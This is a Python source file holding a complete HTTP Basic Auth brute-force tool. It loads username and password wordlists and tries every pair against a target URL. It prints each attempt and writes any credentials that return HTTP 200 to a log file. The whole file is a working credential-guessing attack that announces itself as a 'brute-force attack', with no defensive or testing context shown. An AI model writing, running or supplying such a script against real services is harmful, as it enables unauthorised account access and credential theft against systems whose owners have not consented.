import requests
from requests.auth import HTTPBasicAuth

def basic_auth_brute_force(url, username_list, password_list, output_file=None):
    """
    Attempts to login using every combination of username and password.
    """
    for username in username_list:
        for password in password_list:
            print(f"Trying: {username}:{password}")
            try:
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
                if response.status_code == 200:
                    success_msg = f"Success! Credentials found: {username} / {password}"
                    print(f"\n[+] {success_msg}")
                    
                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(f"\n--- Brute Force Success on {url} ---\n")
                            f.write(f"{success_msg}\n")
                            f.write("------------------------------------\n")
                    return True
            except requests.exceptions.RequestException:
                pass # Skip network errors
    
    print("\n[-] No valid credentials found.")
    return False

def main_brute_force_function(target_url, username_file, password_file, output_file=None):
    try:
        with open(username_file, 'r') as file:
            usernames = [line.strip() for line in file if line.strip()]
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Error: Wordlist files not found.")
        return

    print(f"\n[*] Starting brute-force attack on: {target_url}")
    basic_auth_brute_force(target_url, usernames, passwords, output_file)
